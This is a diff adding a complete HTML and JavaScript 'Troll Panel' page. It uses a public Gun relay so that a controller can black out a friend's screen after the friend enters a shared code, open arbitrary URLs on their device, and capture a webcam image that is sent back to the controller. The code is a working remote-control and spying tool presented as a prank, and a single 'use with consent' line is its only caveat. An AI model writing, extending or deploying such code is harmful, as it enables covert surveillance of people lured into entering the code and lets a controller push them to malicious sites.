@@ -1,0 +1,387 @@
+<html><head><base href="https://websim.creationengine.ai/troll-panel-v6/">
+<title>Troll Panel</title>
+<style>
+    body, html {
+        margin: 0;
+        padding: 0;
+        height: 100%;
+        font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        background-color: #2c3e50;
+        color: #ecf0f1;
+    }
+    #initial-screen {
+        display: flex;
+        flex-direction: column;
+        justify-content: center;
+        align-items: center;
+        height: 100%;
+        transition: opacity 1s ease-out;
+    }
+    #command-prompt {
+        display: none;
+        height: 100%;
+        width: 100%;
+        background-color: #34495e;
+        color: #ecf0f1;
+        padding: 20px;
+        box-sizing: border-box;
+        overflow-y: auto;
+    }
+    .title-bar {
+        background-color: #2980b9;
+        color: #ecf0f1;
+        padding: 10px;
+        font-weight: bold;
+        display: flex;
+        align-items: center;
+        border-top-left-radius: 5px;
+        border-top-right-radius: 5px;
+    }
+    .window-controls {
+        display: flex;
+        margin-right: 10px;
+    }
+    .window-control {
+        width: 12px;
+        height: 12px;
+        border-radius: 50%;
+        margin-right: 8px;
+    }
+    .close {
+        background-color: #ff5f56;
+    }
+    .minimize {
+        background-color: #ffbd2e;
+    }
+    .maximize {
+        background-color: #27c93f;
+    }
+    #content {
+        margin-top: 10px;
+        white-space: pre-wrap;
+        font-family: 'Consolas', 'Courier New', monospace;
+    }
+    input, button {
+        font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        font-size: 16px;
+        margin: 10px;
+        padding: 10px;
+        border-radius: 5px;
+        border: none;
+    }
+    input {
+        background-color: #ecf0f1;
+        color: #2c3e50;
+        width: 250px;
+    }
+    button {
+        background-color: #3498db;
+        color: #ecf0f1;
+        cursor: pointer;
+        transition: background-color 0.3s;
+    }
+    button:hover {
+        background-color: #2980b9;
+    }
+    .cursor {
+        animation: blink 0.7s infinite;
+    }
+    @keyframes blink {
+        0% { opacity: 0; }
+        50% { opacity: 1; }
+        100% { opacity: 0; }
+    }
+    #status {
+        color: #f1c40f;
+        margin-top: 10px;
+    }
+    #black-screen {
+        display: none;
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background-color: #000;
+        z-index: 9999;
+    }
+    #webcam-container {
+        display: none;
+    }
+    #webcam-image {
+        max-width: 100%;
+        max-height: 300px;
+        margin-top: 10px;
+        border-radius: 5px;
+    }
+    h1 {
+        color: #3498db;
+        font-size: 2.5em;
+        margin-bottom: 30px;
+    }
+    #options {
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+    }
+    .option-button {
+        width: 200px;
+        margin: 10px;
+    }
+    #how-to-use {
+        display: none;
+        background-color: rgba(52, 73, 94, 0.9);
+        position: fixed;
+        top: 50%;
+        left: 50%;
+        transform: translate(-50%, -50%);
+        padding: 20px;
+        border-radius: 10px;
+        max-width: 80%;
+        max-height: 80%;
+        overflow-y: auto;
+    }
+    #how-to-use h2 {
+        color: #3498db;
+    }
+    #close-how-to-use {
+        position: absolute;
+        top: 10px;
+        right: 10px;
+        background: none;
+        border: none;
+        color: #ecf0f1;
+        font-size: 20px;
+        cursor: pointer;
+    }
+</style>
+</head>
+<body>
+<div id="initial-screen">
+    <h1>Troll Panel</h1>
+    <div id="options">
+        <button id="enterCodeBtn" class="option-button">Enter Code</button>
+        <button id="howToUseBtn" class="option-button">How to Use</button>
+        <button id="generateCodeBtn" class="option-button">Generate Code</button>
+    </div>
+    <div id="codeInputContainer" style="display: none;">
+        <input type="text" id="codeInput" placeholder="Enter Code">
+        <button id="submitBtn">Submit Code</button>
+    </div>
+    <div id="code"></div>
+</div>
+
+<div id="how-to-use">
+    <h2>How to Use Troll Panel</h2>
+    <button id="close-how-to-use">&times;</button>
+    <p>1. Click "Generate Code" to create a unique 10-digit code.</p>
+    <p>2. Share this code with your friend.</p>
+    <p>3. When your friend enters the code, their screen will turn black.</p>
+    <p>4. You can then use commands like "/url [url]" to open a URL on their device.</p>
+    <p>5. Use "/webcam" to capture an image from their webcam.</p>
+    <p>Note: Use responsibly and only with consent!</p>
+</div>
+
+<div id="command-prompt">
+    <div class="title-bar">
+        <div class="window-controls">
+            <div class="window-control close"></div>
+            <div class="window-control minimize"></div>
+            <div class="window-control maximize"></div>
+        </div>
+        <span>Troll Panel Command Prompt</span>
+    </div>
+    <div id="content"></div>
+    <div id="status"></div>
+    <div id="webcam-container">
+        <video id="webcam" style="display:none;"></video>
+        <canvas id="canvas" style="display:none;"></canvas>
+        <img id="webcam-image" alt="Webcam capture" style="display:none;">
+    </div>
+</div>
+
+<div id="black-screen"></div>
+
+<script src="https://cdn.jsdelivr.net/npm/gun/gun.js"></script>
+<script>
+    const gun = Gun(['https://gun-manhattan.herokuapp.com/gun']);
+    const enterCodeBtn = document.getElementById('enterCodeBtn');
+    const howToUseBtn = document.getElementById('howToUseBtn');
+    const generateCodeBtn = document.getElementById('generateCodeBtn');
+    const submitBtn = document.getElementById('submitBtn');
+    const codeInput = document.getElementById('codeInput');
+    const codeInputContainer = document.getElementById('codeInputContainer');
+    const codeDisplay = document.getElementById('code');
+    const initialScreen = document.getElementById('initial-screen');
+    const commandPrompt = document.getElementById('command-prompt');
+    const content = document.getElementById('content');
+    const status = document.getElementById('status');
+    const blackScreen = document.getElementById('black-screen');
+    const webcamContainer = document.getElementById('webcam-container');
+    const webcamImage = document.getElementById('webcam-image');
+    const howToUseModal = document.getElementById('how-to-use');
+    const closeHowToUseBtn = document.getElementById('close-how-to-use');
+
+    let currentCode = '';
+    let currentInput = '';
+    let isController = false;
+    let sessionId = '';
+    let webcamStream = null;
+
+    function generateCode() {
+        currentCode = Math.random().toString().slice(2, 12);
+        codeDisplay.textContent = `Your code: ${currentCode}`;
+        isController = true;
+        sessionId = Math.random().toString(36).substring(7);
+        gun.get('codes').put({ code: currentCode, sessionId: sessionId });
+        setTimeout(transformToCommandPrompt, 2000);
+    }
+
+    function transformToCommandPrompt() {
+        initialScreen.style.opacity = '0';
+        setTimeout(() => {
+            initialScreen.style.display = 'none';
+            commandPrompt.style.display = 'block';
+            animateCommandPrompt();
+        }, 1000);
+    }
+
+    function animateCommandPrompt() {
+        content.innerHTML = '';
+        const text = 'Troll Panel [Version 1.0.0]\n(c) 2023 Troll Inc. All rights reserved.\n\nC:\\TrollPanel>';
+        let i = 0;
+
+        function typeWriter() {
+            if (i < text.length) {
+                content.innerHTML += text.charAt(i);
+                i++;
+                setTimeout(typeWriter, 20);
+            } else {
+                content.innerHTML += ' <span class="cursor">|</span>';
+                content.scrollTop = content.scrollHeight;
+            }
+        }
+
+        typeWriter();
+    }
+
+    enterCodeBtn.addEventListener('click', () => {
+        codeInputContainer.style.display = 'block';
+        enterCodeBtn.style.display = 'none';
+    });
+
+    howToUseBtn.addEventListener('click', () => {
+        howToUseModal.style.display = 'block';
+    });
+
+    closeHowToUseBtn.addEventListener('click', () => {
+        howToUseModal.style.display = 'none';
+    });
+
+    generateCodeBtn.addEventListener('click', generateCode);
+
+    submitBtn.addEventListener('click', () => {
+        const enteredCode = codeInput.value;
+        gun.get('codes').once((data) => {
+            if (data && data.code === enteredCode) {
+                sessionId = data.sessionId;
+                blackScreen.style.display = 'block';
+                gun.get(`sessions/${sessionId}`).on(handleCommand);
+            } else {
+                codeInput.value = '';
+                codeInput.placeholder = 'Invalid code, try again';
+            }
+        });
+    });
+
+    async function handleCommand(data) {
+        if (data.url) {
+            window.open(data.url, '_blank');
+        }
+        if (data.webcam) {
+            try {
+                webcamStream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const video = document.getElementById('webcam');
+                video.srcObject = webcamStream;
+                video.play();
+                setTimeout(() => {
+                    const canvas = document.getElementById('canvas');
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    canvas.getContext('2d').drawImage(video, 0, 0);
+                    const imageData = canvas.toDataURL('image/jpeg');
+                    gun.get(`sessions/${sessionId}`).put({ webcamImage: imageData });
+                    webcamStream.getTracks().forEach(track => track.stop());
+                }, 1000);
+            } catch (error) {
+                console.error('Error accessing webcam:', error);
+                gun.get(`sessions/${sessionId}`).put({ webcamError: 'Failed to access webcam' });
+            }
+        }
+    }
+
+    document.addEventListener('keydown', (e) => {
+        if (commandPrompt.style.display === 'block') {
+            if (e.key === 'Enter') {
+                executeCommand();
+            } else if (e.key === 'Backspace') {
+                currentInput = currentInput.slice(0, -1);
+                updatePrompt();
+            } else if (e.key.length === 1) {
+                currentInput += e.key;
+                updatePrompt();
+            }
+        }
+    });
+
+    function updatePrompt() {
+        const lines = content.innerHTML.split('\n');
+        lines[lines.length - 1] = `C:\\TrollPanel>${currentInput}<span class="cursor">|</span>`;
+        content.innerHTML = lines.join('\n');
+        content.scrollTop = content.scrollHeight;
+    }
+
+    function executeCommand() {
+        const command = currentInput.trim();
+        content.innerHTML = content.innerHTML.replace('<span class="cursor">|</span>', '');
+        content.innerHTML += '\n';
+
+        if (command.startsWith('/url ') && isController) {
+            const url = command.slice(5);
+            gun.get(`sessions/${sessionId}`).put({ url: url });
+            content.innerHTML += `Opening URL on target machine: ${url}\n`;
+            setStatus('Running...', 'Command executed successfully.');
+        } else if (command === '/webcam' && isController) {
+            gun.get(`sessions/${sessionId}`).put({ webcam: true });
+            content.innerHTML += 'Capturing webcam image on target machine...\n';
+            setStatus('Capturing...', 'Waiting for webcam image...');
+            gun.get(`sessions/${sessionId}`).on((data) => {
+                if (data.webcamImage) {
+                    webcamImage.src = data.webcamImage;
+                    webcamImage.style.display = 'block';
+                    setStatus('', 'Webcam image received.');
+                } else if (data.webcamError) {
+                    setStatus('', `Error: ${data.webcamError}`);
+                }
+            });
+        } else {
+            content.innerHTML += `'${command}' is not recognized as an internal or external command, operable program or batch file.\n`;
+        }
+
+        currentInput = '';
+        content.innerHTML += 'C:\\TrollPanel>';
+        content.scrollTop = content.scrollHeight;
+    }
+
+    function setStatus(runningMessage, completedMessage) {
+        status.textContent = runningMessage;
+        setTimeout(() => {
+            status.textContent = completedMessage;
+            setTimeout(() => {
+                status.textContent = '';
+            }, 3000);
+        }, 2000);
+    }
+</script>
+</body>
+</html>
